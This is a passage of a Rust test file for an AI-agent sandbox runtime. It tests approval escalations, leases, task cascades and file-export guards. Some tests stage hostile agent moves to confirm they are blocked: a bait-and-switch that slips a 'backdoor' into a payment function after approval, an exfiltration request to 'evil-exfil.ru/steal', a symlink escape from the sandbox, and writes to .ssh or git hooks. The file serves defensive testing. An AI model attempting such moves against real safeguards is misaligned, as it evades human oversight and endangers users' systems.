                vec!["*".to_string()],
            )
            .await
            .unwrap();

        let start_out = kernel
            .call_tool(
                &agent,
                "proc_exec",
                json!({
                    "command": "sh",
                    "args": ["-c", "echo 'benchmark_done_123'"],
                    "background": true
                }),
            )
            .await
            .unwrap();
        let pid = start_out["pid"].as_u64().expect("Expected background pid");
        assert!(pid > 0);
        assert!(start_out["exit_code"].is_null());

        for _ in 0..20 {
            let poll = kernel
                .call_tool(&agent, "proc_exec", json!({ "poll_pid": pid }))
                .await
                .unwrap();
            if poll["exit_status"] == "exited"
                && poll["stdout"]
                    .as_str()
                    .unwrap_or("")
                    .contains("benchmark_done_123")
            {
                assert_eq!(poll["exit_code"], json!(0));
                return;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        panic!("Background job did not complete within expected window");
    }

    #[tokio::test]
    async fn test_multi_agent_collaboration_task_tree_claims_ipc_wait_and_hash_chain() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_dir = temp.path().join("runtime");
        let host_project = temp.path().join("host_project");
        tokio::fs::create_dir_all(host_project.join("crates/aos-vfs/src"))
            .await
            .unwrap();
        tokio::fs::write(
            host_project.join("crates/aos-vfs/src/lib.rs"),
            "pub fn v1() -> u32 { 1 }\n",
        )
        .await
        .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_dir).await.unwrap());
        let user_client = AgentIdentity::new("acme", "user-lead", "Requester");
        let lead_agent = AgentIdentity::new("acme", "agy-lead", "Lead Architect");
        let worker_agent = AgentIdentity::new("acme", "claude-worker", "Worker");

        for id in [&user_client, &lead_agent, &worker_agent] {
            kernel
                .ensure_agent_environment(
                    id.clone(),
                    &host_project,
                    IsolationTier::NativeOsSandbox,
                    vec!["*".to_string()],
                )
                .await
                .unwrap();
        }

        // 1. User assigns parent task T1 to Lead Agent (`agy-lead`)
        let t1_sent = kernel
            .call_tool(
                &user_client,
                "ipc_request",
                json!({
                    "to_agent": "agy-lead",
                    "subject": "Upgrade VFS collaboration engine",
                    "payload": { "goal": "phase-abc" }
                }),
            )
            .await
            .unwrap();
        let t1_id = t1_sent["msg_id"].as_str().unwrap().to_string();

        // Grant a TaskScoped workspace_commit lease bound to T1 for Lead Agent
        let lease_res = kernel
            .call_tool(
                &lead_agent,
                "policy_grant_lease",
                json!({
                    "action_pattern": "workspace_commit",
                    "resource_pattern": "*",
                    "ttl_secs": 600,
                    "task_id": t1_id
                }),
            )
            .await
            .unwrap();
        let t1_lease_id = lease_res["lease_id"].as_str().unwrap().to_string();

        // 2. While working on T1, Lead Agent delegates subtask T2 to Worker Agent (`claude-worker`).
        //    Verify T2 automatically inherits `parent_task_id = T1`, and Lead Agent's `active_task_id`
        //    remains T1 (no silent downgrade of TaskScoped lease!).
        let t2_sent = kernel
            .call_tool(
                &lead_agent,
                "ipc_request",
                json!({
                    "to_agent": "claude-worker",
                    "subject": "Implement VFS helper",
                    "payload": { "module": "vfs" }
                }),
            )
            .await
            .unwrap();
        let t2_id = t2_sent["msg_id"].as_str().unwrap().to_string();
        assert_eq!(
            kernel.active_task_id(&lead_agent).await.as_deref(),
            Some(t1_id.as_str()),
            "Delegating subtask T2 must not clobber Lead Agent's active_task_id T1"
        );

        let t2_info = kernel
            .call_tool(&lead_agent, "ipc_task_get", json!({ "task_id": t2_id }))
            .await
            .unwrap();
        assert_eq!(t2_info["parent_task_id"], json!(t1_id));

        // 3. Lead Agent claims `crates/aos-vfs/**` (auto-bound to T1).
        //    Worker Agent attempts overlapping glob `crates/*/src/lib.rs` -> rejected by 2D NFA glob check!
        let claim_lead = kernel
            .call_tool(
                &lead_agent,
                "coord_claim",
                json!({ "paths": ["crates/aos-vfs/**"], "note": "Lead editing VFS" }),
            )
            .await
            .unwrap();
        assert_eq!(claim_lead["status"], "ok");

        let claim_worker_clash = kernel
            .call_tool(
                &worker_agent,
                "coord_claim",
                json!({ "paths": ["crates/*/src/lib.rs"] }),
            )
            .await
            .unwrap();
        assert_eq!(claim_worker_clash["status"], "partial");
        assert_eq!(claim_worker_clash["rejected"].as_array().unwrap().len(), 1);

        // 4. Worker Agent modifies `crates/aos-vfs/src/lib.rs` via `proc_exec` inside its shadow
        //    -> `proc_exec` returns `coordination_warning` alerting that `agy-lead` holds the claim!
        let exec_warn = kernel
            .call_tool(
                &worker_agent,
                "proc_exec",
                json!({
                    "command": "sh",
                    "args": ["-c", "echo '// worker edit' >> crates/aos-vfs/src/lib.rs"]
                }),
            )
            .await
            .unwrap();
        assert!(
            exec_warn["coordination_warning"]
                .as_str()
                .unwrap_or("")
                .contains("agy-lead"),
            "Expected coordination_warning on proc_exec touching peer-claimed path, got: {exec_warn}"
        );
        // Rollback worker's uncoordinated edit before waiting properly via `ipc_wait`
        let snaps = kernel
            .call_tool(&worker_agent, "workspace_status", json!({}))
            .await
            .unwrap();
        let base_snap = snaps["snapshots"][0]["snapshot_id"].as_str().unwrap();
        kernel
            .call_tool(
                &worker_agent,
                "workspace_rollback",
                json!({ "snapshot_id": base_snap }),
            )
            .await
            .unwrap();

        // 5. Worker Agent calls `ipc_wait(claim_paths=["crates/aos-vfs/src/lib.rs"], auto_claim=true)`
        //    concurrently while Lead Agent edits and runs `workspace_commit` (which auto-releases its claim!).
        let k_wait = kernel.clone();
        let worker_clone = worker_agent.clone();
        let wait_handle = tokio::spawn(async move {
            k_wait
                .call_tool(
                    &worker_clone,
                    "ipc_wait",
                    json!({
                        "claim_paths": ["crates/aos-vfs/src/lib.rs"],
                        "auto_claim": true,
                        "timeout_ms": 5000
                    }),
                )
                .await
                .unwrap()
        });

        tokio::time::sleep(std::time::Duration::from_millis(120)).await;
        kernel
            .call_tool(
                &lead_agent,
                "fs_write",
                json!({
                    "path": "crates/aos-vfs/src/lib.rs",
                    "content": "pub fn v1() -> u32 { 1 }\npub fn v2_from_lead() -> u32 { 2 }\n"
                }),
            )
            .await
            .unwrap();
        let commit_out = kernel
            .call_tool(&lead_agent, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(commit_out["status"], "committed_to_host");
        assert_eq!(
            commit_out["released_claims"],
            json!(["crates/aos-vfs/**"]),
            "workspace_commit should auto-release matching claims by default"
        );

        let wait_res = wait_handle.await.unwrap();
        assert_eq!(wait_res["status"], "ready");
        assert_eq!(wait_res["reason"], "claims_available");
        assert_eq!(
            wait_res["claimed"]["changed"],
            json!(["crates/aos-vfs/src/lib.rs"])
        );
        // Verify Worker Agent's shadow workspace was automatically rebased onto Lead Agent's commit!
        let worker_read = kernel
            .call_tool(
                &worker_agent,
                "fs_read",
                json!({ "path": "crates/aos-vfs/src/lib.rs" }),
            )
            .await
            .unwrap();
        assert!(
            worker_read["content"]
                .as_str()
                .unwrap()
                .contains("v2_from_lead"),
            "ipc_wait should auto-rebase worker shadow workspace onto peer commit"
        );

        // 6. Verify Cascade Cancel on parent task T1 cancels child task T2, revokes T1's TaskScoped
        //    lease, and auto-releases T2's bound file claim (`crates/aos-vfs/src/lib.rs`)!
        kernel
            .call_tool(
                &user_client,
                "ipc_task_update",
                json!({
                    "task_id": t1_id,
                    "state": "canceled",
                    "message": "Cancel parent epic"
                }),
            )
            .await
            .unwrap();

        let t1_final = kernel
            .call_tool(
                &user_client,
                "ipc_task_get",
                json!({ "task_id": t1_id, "include_audit_trace": true }),
            )
            .await
            .unwrap();
        assert_eq!(t1_final["state"], "canceled");
        assert_eq!(t1_final["subtasks_count"], 1);
        assert_eq!(t1_final["subtasks"][0]["id"], t2_id);
        assert_eq!(t1_final["subtasks"][0]["state"], "canceled");
        assert_eq!(t1_final["hash_chain_verified"], true);
        assert!(
            !t1_final["audit_trace"].as_array().unwrap().is_empty(),
            "ipc_task_get should return the task's Flight Recorder audit trace"
        );
        assert_eq!(t1_final["lease_ids"], json!([t1_lease_id]));

        // Both T1's TaskScoped lease and T2's file claim must have been cleaned up automatically!
        let (remaining_claims, _) = kernel.load_claims("acme").await.unwrap();
        assert!(
            remaining_claims.is_empty(),
            "Cascade cancel must release child task T2's bound claims, found: {remaining_claims:?}"
        );
        let remaining_leases = kernel.policy.list_leases("acme", None).await.unwrap();
        assert!(
            remaining_leases.is_empty(),
            "Terminal task cleanup must revoke TaskScoped leases"
        );
    }

    #[tokio::test]
    async fn test_toctou_diff_swap_egress_escalation_and_hash_chain_audit() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_dir = temp.path().join("runtime");
        let host_project = temp.path().join("host_project");
        tokio::fs::create_dir_all(host_project.join("src"))
            .await
            .unwrap();
        tokio::fs::write(host_project.join("README.md"), "# Benign Doc\n")
            .await
            .unwrap();
        tokio::fs::write(
            host_project.join("src/payment_engine.rs"),
            "pub fn charge(cents: u64) -> u64 { cents }\n",
        )
        .await
        .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_dir).await.unwrap());
        let agent = AgentIdentity::new("acme", "coder-alpha", "Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_project,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. Agent edits benign README.md and requests `workspace_commit` -> mints `esc-*` with `evidence_hash`
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "README.md",
                    "content": "# Benign Doc (fixed typo)\n"
                }),
            )
            .await
            .unwrap();
        let ask_1 = kernel
            .call_tool(
                &agent,
                "workspace_commit",
                json!({ "rationale": "Fix typo in README" }),
            )
            .await
            .unwrap();
        assert_eq!(ask_1["status"], "approval_required");
        let esc_1 = ask_1["escalation_id"].as_str().unwrap().to_string();
        let hash_1 = ask_1["evidence_hash"].as_str().unwrap().to_string();
        assert_eq!(hash_1.len(), 64);

        // Human approves `esc_1` as a One-Shot (`ttl_secs = 0`) lease
        let lease_1 = kernel
            .policy
            .approve_escalation(&esc_1, 0, "human-lead")
            .await
            .unwrap();
        assert_eq!(lease_1.resource_pattern, format!("sha256:{}", hash_1));

        // 2. TOCTOU Bait-and-Switch attack: Agent sneaks a malicious change into `src/payment_engine.rs`
        //    BEFORE calling `workspace_commit` again, hoping to use the One-Shot lease!
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "src/payment_engine.rs",
                    "content": "pub fn charge(_cents: u64) -> u64 { 0 /* backdoor */ }\n"
                }),
            )
            .await
            .unwrap();
        let swapped_attempt = kernel
            .call_tool(&agent, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(
            swapped_attempt["status"], "approval_required",
            "Mutated shadow diff must NOT bypass approval via the One-Shot lease pinned to hash_1"
        );
        let host_payment = tokio::fs::read_to_string(host_project.join("src/payment_engine.rs"))
            .await
            .unwrap();
        assert!(
            !host_payment.contains("backdoor"),
            "Host repository must remain untouched after blocked TOCTOU diff swap"
        );

        // Restore `src/payment_engine.rs` to baseline -> original diff matches `hash_1` and commits!
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "src/payment_engine.rs",
                    "content": "pub fn charge(cents: u64) -> u64 { cents }\n"
                }),
            )
            .await
            .unwrap();
        let clean_commit = kernel
            .call_tool(&agent, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(clean_commit["status"], "committed_to_host");

        // 3. Egress unlisted domain escalation: calling `egress_http_request` on `api.stripe.com`
        //    mints an `egress_unlisted_domain` escalation ticket scoped to `api.stripe.com`.
        let egress_ask = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "target_domain": "api.stripe.com",
                    "method": "POST",
                    "path": "/v1/charges"
                }),
            )
            .await
            .unwrap();
        assert_eq!(egress_ask["status"], "approval_required");
        let egress_esc_id = egress_ask["escalation_id"].as_str().unwrap();
        kernel
            .call_tool(
                &agent,
                "policy_approve_escalation",
                json!({ "escalation_id": egress_esc_id, "ttl_secs": 300 }),
            )
            .await
            .unwrap();

        let egress_ok = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "target_domain": "api.stripe.com",
                    "method": "POST",
                    "path": "/v1/charges"
                }),
            )
            .await
            .unwrap();
        assert!(egress_ok.get("AllowedAndSanitized").is_some(), "{egress_ok}");

        // Unapproved domain `evil-exfil.ru` still escalates!
        let evil_ask = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "target_domain": "evil-exfil.ru",
                    "method": "POST",
                    "path": "/steal"
                }),
            )
            .await
            .unwrap();
        assert_eq!(evil_ask["status"], "approval_required");

        // 4. Verify SHA-256 hash-chained audit ledger (`FlightRecorder`) recorded both `ask:` and `approved:` events
        let chain = kernel.recorder.verify_chain(Some("acme")).await.unwrap();
        assert_eq!(chain["verified"], true);
        let events = kernel
            .recorder
            .query_events("acme", Some("coder-alpha"), 100)
            .await
            .unwrap();
        assert!(events
            .iter()
            .any(|e| e.policy_decision.starts_with("approved:")));
    }

    #[tokio::test]
    async fn test_web_approval_diff_preview_batched_sensitive_commit_and_lease_revocation() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_dir = temp.path().join("runtime");
        let host_project = temp.path().join("host_project");
        tokio::fs::create_dir_all(&host_project).await.unwrap();
        tokio::fs::write(host_project.join("Cargo.toml"), "[package]\nname = \"demo\"\n")
            .await
            .unwrap();
        tokio::fs::write(host_project.join("package.json"), "{\"name\":\"demo\"}\n")
            .await
            .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_dir).await.unwrap());
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", host_project.clone())
            .await
            .unwrap();
        let op = kernel.operator_token();

        let agent = AgentIdentity::new("acme", "coder-beta", "Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_project,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. Agent modifies BOTH sensitive files (`Cargo.toml` and `package.json`) in a single commit
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "Cargo.toml",
                    "content": "[package]\nname = \"demo\"\nversion = \"0.2.0\"\n"
                }),
            )
            .await
            .unwrap();
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "package.json",
                    "content": "{\"name\":\"demo\",\"version\":\"0.2.0\"}\n"
                }),
            )
            .await
            .unwrap();

        let ask = kernel
            .call_tool(
                &agent,
                "workspace_commit",
                json!({ "rationale": "Bump version across Rust and Node manifests" }),
            )
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        let esc_id = ask["escalation_id"].as_str().unwrap().to_string();

        // 2. Web console fetches `GET /v1/approvals/diff?escalation_id=...` -> returns unified diff & rationale
        let (head, diff_resp) = raw_http(
            addr,
            "GET",
            &format!("/v1/approvals/diff?escalation_id={esc_id}"),
            Some(&op),
            None,
        )
        .await;
        assert!(head.contains("200 OK"), "{head} {diff_resp}");
        assert_eq!(
            diff_resp["rationale"],
            "Bump version across Rust and Node manifests"
        );
        let udiff = diff_resp["diff"]["unified_diff"].as_str().unwrap_or("");
        assert!(udiff.contains("Cargo.toml") && udiff.contains("package.json"), "{diff_resp}");

        // 3. Approving the single batched escalation once (`ttl_secs = 0`) authorizes BOTH sensitive files in 1 click!
        let (head, dec_resp) = raw_http(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op),
            Some(json!({ "escalation_id": esc_id, "decision": "approve", "ttl_secs": 0 })),
        )
        .await;
        assert!(head.contains("200 OK"), "{head} {dec_resp}");

        let commit_ok = kernel
            .call_tool(&agent, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(
            commit_ok["status"], "committed_to_host",
            "Single approval of batched sensitive commit must land all sensitive files without whack-a-mole"
        );

        // 4. Grant a 1-hour session lease and revoke it via `POST /v1/leases/revoke`
        let granted = kernel
            .call_tool(
                &agent,
                "policy_grant_lease",
                json!({
                    "action_pattern": "workspace_commit",
                    "resource_pattern": "*",
                    "ttl_secs": 3600
                }),
            )
            .await
            .unwrap();
        let lease_id = granted["lease_id"].as_str().unwrap().to_string();
        assert!(!kernel.policy.list_leases("acme", None).await.unwrap().is_empty());

        let (head, rev_resp) = raw_http(
            addr,
            "POST",
            "/v1/leases/revoke",
            Some(&op),
            Some(json!({ "lease_id": lease_id })),
        )
        .await;
        assert!(head.contains("200 OK"), "{head} {rev_resp}");
        assert_eq!(rev_resp["status"], "revoked");
        assert!(
            kernel
                .policy
                .list_leases("acme", None)
                .await
                .unwrap()
                .iter()
                .all(|l| l.lease_id != lease_id),
            "Revoked lease must be removed from active leases"
        );
    }

    #[tokio::test]
    async fn test_orphaned_shadow_detection_and_recovery_after_crash() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_root = temp.path().join("runtime");
        let host_repo = temp.path().join("host_repo");
        tokio::fs::create_dir_all(&host_repo).await.unwrap();
        tokio::fs::write(host_repo.join("main.rs"), "fn main() {}\n")
            .await
            .unwrap();

        {
            let kernel1 = AegisRuntimeKernel::new(&runtime_root).await.unwrap();
            let crashed = AgentIdentity::new("org-recover", "agy-dead", "Worker");
            kernel1
                .ensure_agent_environment(
                    crashed.clone(),
                    &host_repo,
                    IsolationTier::NativeOsSandbox,
                    vec!["*".to_string()],
                )
                .await
                .unwrap();
            kernel1
                .ipc
                .update_peer_metadata(
                    &crashed,
                    Some("agy".to_string()),
                    Some(999_999_999),
                    Some(1),
                    Some(host_repo.display().to_string()),
                )
                .await
                .unwrap();
            kernel1
                .call_tool(
                    &crashed,
                    "fs_write",
                    json!({ "path": "recovered_exp.rs", "content": "pub fn exp() -> u32 { 42 }\n" }),
                )
                .await
                .unwrap();
            kernel1
                .call_tool(
                    &crashed,
                    "fs_write",
                    json!({ "path": "main.rs", "content": "fn main() { println!(\"recovered\"); }\n" }),
                )
                .await
                .unwrap();
            kernel1
                .call_tool(
                    &crashed,
                    "workspace_snapshot",
                    json!({ "label": "before-crash" }),
                )
                .await
                .unwrap();
        }

        // Simulate post-reboot fresh runtime kernel and new agent session.
        let kernel2 = AegisRuntimeKernel::new(&runtime_root).await.unwrap();
        let new_agent = AgentIdentity::new("org-recover", "agy-live", "Lead");
        kernel2
            .ensure_agent_environment(
                new_agent.clone(),
                &host_repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        let status = kernel2
            .call_tool(&new_agent, "workspace_status", json!({}))
            .await
            .unwrap();
        let orphaned = status["recoverable_orphaned_shadows"].as_array().unwrap();
        assert_eq!(orphaned.len(), 1, "expected 1 orphaned shadow: {status}");
        assert_eq!(orphaned[0]["agent_id"], "agy-dead");
        assert_eq!(orphaned[0]["uncommitted_changes_count"], 2);

        let sync_res = kernel2
            .call_tool(
                &new_agent,
                "workspace_sync",
                json!({ "adopt_orphaned_agent": "agy-dead" }),
            )
            .await
            .unwrap();
        assert_eq!(
            sync_res["orphan_recovery"]["status"],
            "recovered_orphaned_shadow"
        );
        assert_eq!(sync_res["orphan_recovery"]["recovered_paths_count"], 2);

        let read_new = kernel2
            .call_tool(&new_agent, "fs_read", json!({ "path": "recovered_exp.rs" }))
            .await
            .unwrap();
        assert_eq!(read_new["content"], "pub fn exp() -> u32 { 42 }\n");
        let read_main = kernel2
            .call_tool(&new_agent, "fs_read", json!({ "path": "main.rs" }))
            .await
            .unwrap();
        assert_eq!(
            read_main["content"],
            "fn main() { println!(\"recovered\"); }\n"
        );

        // Host repo must remain untouched until explicit workspace_commit.
        assert!(!host_repo.join("recovered_exp.rs").exists());
        assert_eq!(
            std::fs::read_to_string(host_repo.join("main.rs")).unwrap(),
            "fn main() {}\n"
        );
    }

    struct TestPaasVaultMounter {
        store: PathBuf,
        mounted: std::sync::Mutex<std::collections::HashSet<PathBuf>>,
    }

    impl TestPaasVaultMounter {
        fn copy_dir(src: &Path, dst: &Path) -> std::io::Result<()> {
            std::fs::create_dir_all(dst)?;
            for entry in std::fs::read_dir(src)? {
                let entry = entry?;
                let sp = entry.path();
                let dp = dst.join(entry.file_name());
                let meta = std::fs::symlink_metadata(&sp)?;
                if meta.file_type().is_symlink() {
                    #[cfg(unix)]
                    {
                        let t = std::fs::read_link(&sp)?;
                        let _ = std::fs::remove_file(&dp);
                        std::os::unix::fs::symlink(t, &dp)?;
                    }
                } else if meta.is_dir() {
                    Self::copy_dir(&sp, &dp)?;
                } else {
                    std::fs::copy(&sp, &dp)?;
                }
            }
            Ok(())
        }
    }

    impl aos_vfs::vault::VolumeMounter for TestPaasVaultMounter {
        fn detect_preferred_backend(&self) -> aos_vfs::vault::VaultBackendKind {
            aos_vfs::vault::VaultBackendKind::LuksBtrfs
        }

        fn is_mounted(&self, mount_dir: &Path) -> bool {
            self.mounted.lock().unwrap().contains(mount_dir)
        }

        fn create_and_mount(
            &self,
            _backend: aos_vfs::vault::VaultBackendKind,
            org_id: &str,
            backing_path: &Path,
            mount_dir: &Path,
            _size_gb: u64,
            _dek: &str,
        ) -> anyhow::Result<()> {
            if let Some(p) = backing_path.parent() {
                std::fs::create_dir_all(p)?;
            }
            std::fs::write(backing_path, b"LUKS2_MOCK")?;
            std::fs::create_dir_all(self.store.join(org_id))?;
            std::fs::create_dir_all(mount_dir)?;
            self.mounted.lock().unwrap().insert(mount_dir.to_path_buf());
            Ok(())
        }

        fn mount_existing(
            &self,
            _backend: aos_vfs::vault::VaultBackendKind,
            org_id: &str,
            backing_path: &Path,
            mount_dir: &Path,
            _dek: &str,
        ) -> anyhow::Result<()> {
            if !backing_path.exists() {
                bail!("missing backing");
            }
            std::fs::create_dir_all(mount_dir)?;
            let payload = self.store.join(org_id);
            if payload.is_dir() {
                Self::copy_dir(&payload, mount_dir)?;
            }
            self.mounted.lock().unwrap().insert(mount_dir.to_path_buf());
            Ok(())
        }

        fn unmount(
            &self,
            _backend: aos_vfs::vault::VaultBackendKind,
            org_id: &str,
            mount_dir: &Path,
        ) -> anyhow::Result<()> {
            let payload = self.store.join(org_id);
            if payload.exists() {
                let _ = std::fs::remove_dir_all(&payload);
            }
            if mount_dir.is_dir() {
                Self::copy_dir(mount_dir, &payload)?;
                for entry in std::fs::read_dir(mount_dir)? {
                    let p = entry?.path();
                    if p.is_dir() {
                        std::fs::remove_dir_all(p)?;
                    } else {
                        std::fs::remove_file(p)?;
                    }
                }
            }
            self.mounted.lock().unwrap().remove(mount_dir);
            Ok(())
        }
    }

    #[tokio::test]
    async fn test_paas_hibernate_locks_org_vault_and_wake_unlocks() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_root = temp.path().join("runtime");
        let mounter = Arc::new(TestPaasVaultMounter {
            store: temp.path().join("encrypted_payloads"),
            mounted: std::sync::Mutex::new(std::collections::HashSet::new()),
        });
        let vault = Arc::new(OrgVaultManager::with_components(
            &runtime_root,
            aos_vfs::vault::VaultMode::Enforced,
            4,
            Arc::new(aos_vfs::vault::InMemoryKekProvider::new([0x55u8; 32])),
            mounter,
        ));
        let kernel = Arc::new(
            AegisRuntimeKernel::new_with_vault(&runtime_root, vault.clone())
                .await
                .unwrap(),
        );

        let ws = kernel
            .paas
            .provision_workspace(
                &kernel,
                "cloud-org",
                "ws-vault-test",
                ".",
                "main",
                vec!["agy-cloud".to_string()],
            )
            .await
            .unwrap();
        let st_active = vault.status_org("cloud-org").unwrap();
        assert!(st_active.encrypted);
        assert!(st_active.mounted);
        assert!(
            ws.host_repo_path
                .starts_with(st_active.mount_dir.join("paas_workspaces")),
            "Cloud host_repo_path must live inside encrypted OrgVault mount: {}",
            ws.host_repo_path.display()
        );

        let cloud_agent = AgentIdentity::new("cloud-org", "agy-cloud", "Aegis Cloud Agent");
        kernel
            .call_tool(
                &cloud_agent,
                "fs_write",
                json!({ "path": "cloud_exp.txt", "content": "CLOUD_UNCOMMITTED_EXP" }),
            )
            .await
            .unwrap();

        kernel
            .paas
            .hibernate_workspace(&kernel, "cloud-org", &ws.workspace_id)
            .await
            .unwrap();
        let st_hib = vault.status_org("cloud-org").unwrap();
        assert!(!st_hib.mounted, "Hibernation must lock & unmount OrgVault");
        assert!(
            !st_hib
                .mount_dir
                .join("agents/agy-cloud/cow_workspace/upper_workspace/cloud_exp.txt")
                .exists(),
            "Plaintext shadow file must not exist on mountpoint while hibernated"
        );

        let (_woke, _) = kernel
            .paas
            .wake_workspace_if_needed(&kernel, "cloud-org", &ws.workspace_id)
            .await
            .unwrap();
        let st_woke = vault.status_org("cloud-org").unwrap();
        assert!(st_woke.mounted, "Wake must unlock & mount OrgVault");

        let read_back = kernel
            .call_tool(&cloud_agent, "fs_read", json!({ "path": "cloud_exp.txt" }))
            .await
            .unwrap();
        assert_eq!(read_back["content"], "CLOUD_UNCOMMITTED_EXP");

        let _ = vault.lock_all();
    }

    #[tokio::test]
    async fn test_fs_export_file_zero_copy_pdf_and_security_guards() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_root = temp.path().join("rt");
        let ws_root = temp.path().join("workspace");
        let repo_a = ws_root.join("aegis-os");
        let repo_b = ws_root.join("SYLVA");
        std::fs::create_dir_all(repo_a.join(".git")).unwrap();
        std::fs::create_dir_all(repo_b.join("paper")).unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        let agent = AgentIdentity::new("aegis-os", "agy-pdf-test", "Lead");
        let env = kernel
            .ensure_agent_environment(
                agent.clone(),
                &repo_a,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        let pdf_bytes: Vec<u8> = b"%PDF-1.5\n%\x93\x8c\x8b\x9e\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n".to_vec();
        let tmp_pdf = env.sandbox.config().agent_home_dir.join("main.pdf");
        std::fs::write(&tmp_pdf, &pdf_bytes).unwrap();
        let dst_pdf = std::fs::canonicalize(&repo_b).unwrap().join("paper/main.pdf");

        // 1. First call freezes into CAS and escalates with evidence hash + escalation diff.
        let ask = kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": "$TMPDIR/main.pdf",
                    "dst_host_path": dst_pdf.display().to_string(),
                    "overwrite": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required", "{ask}");
        let esc_id = ask["escalation_id"].as_str().unwrap().to_string();
        let artifact_uri = ask["artifact_uri"].as_str().unwrap().to_string();
        assert!(artifact_uri.starts_with("artifact://aegis-os/sha256:"));
        assert!(runtime_root
            .join("escalation_diffs")
            .join(format!("{esc_id}.json"))
            .is_file());

        // 2. Approve One-Shot (`ttl_secs = 0`) pinned to destination + SHA-256 evidence.
        let lease = kernel
            .policy
            .approve_escalation(&esc_id, 0, "user")
            .await
            .unwrap();
        assert_eq!(lease.kind, LeaseKind::OneShot);

        // 3. Bait-and-switch tamper check: modifying $TMPDIR/main.pdf must miss the SHA-256 pin!
        std::fs::write(&tmp_pdf, b"%PDF-1.5\nTAMPERED_CONTENT\n").unwrap();
        let tampered_res = kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": "$TMPDIR/main.pdf",
                    "dst_host_path": dst_pdf.display().to_string(),
                    "overwrite": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(
            tampered_res["status"], "approval_required",
            "Tampered bytes must NOT consume the SHA-256 pinned One-Shot lease"
        );

        // 4. Exporting using the frozen CAS artifact_uri succeeds with the original One-Shot lease!
        let exported = kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": artifact_uri,
                    "dst_host_path": dst_pdf.display().to_string(),
                    "overwrite": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(exported["status"], "exported_to_host", "{exported}");
        assert_eq!(exported["content_type"], "application/pdf");
        assert_eq!(std::fs::read(&dst_pdf).unwrap(), pdf_bytes);

        // One-Shot lease was consumed, so repeating requires a new approval.
        let second = kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": artifact_uri,
                    "dst_host_path": dst_pdf.display().to_string(),
                    "overwrite": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(second["status"], "approval_required");

        // 5. Security guards:
        // 5a. Symlink source escaping sandbox
        #[cfg(unix)]
        {
            let secret_outside = temp.path().join("host_secret.txt");
            std::fs::write(&secret_outside, b"TOP_SECRET").unwrap();
            let sym_src = env.sandbox.config().agent_home_dir.join("escape.pdf");
            std::os::unix::fs::symlink(&secret_outside, &sym_src).unwrap();
            assert!(kernel
                .call_tool(
                    &agent,
                    "fs_export_file",
                    json!({
                        "src_path": "$TMPDIR/escape.pdf",
                        "dst_host_path": dst_pdf.display().to_string()
                    }),
                )
                .await
                .is_err());
        }

        // 5b. ELF executable payload rejected
        let elf_src = env.sandbox.config().agent_home_dir.join("evil.bin");
        std::fs::write(&elf_src, b"\x7fELF\x02\x01\x01\x00").unwrap();
        assert!(kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": "$TMPDIR/evil.bin",
                    "dst_host_path": std::fs::canonicalize(&repo_b).unwrap().join("evil.bin").display().to_string()
                }),
            )
            .await
            .is_err());

        // 5c. Spoofed .pdf without %PDF- magic header rejected
        let fake_pdf = env.sandbox.config().agent_home_dir.join("fake.pdf");
        std::fs::write(&fake_pdf, b"NOT_A_PDF_HEADER").unwrap();
        assert!(kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": "$TMPDIR/fake.pdf",
                    "dst_host_path": dst_pdf.display().to_string()
                }),
            )
            .await
            .is_err());

        // 5d. Ring-0 & poisoning destinations rejected
        std::fs::write(&tmp_pdf, &pdf_bytes).unwrap();
        for bad_dst in [
            temp.path().join("user/.ssh/id_rsa.pdf"),
            repo_a.join(".git/hooks/pre-commit"),
            repo_a.join("build.rs"),
            runtime_root.join("policy_state.json"),
        ] {
            let txt_src = env.sandbox.config().agent_home_dir.join("benign.txt");
            std::fs::write(&txt_src, b"hello").unwrap();
            assert!(
                kernel
                    .call_tool(
                        &agent,
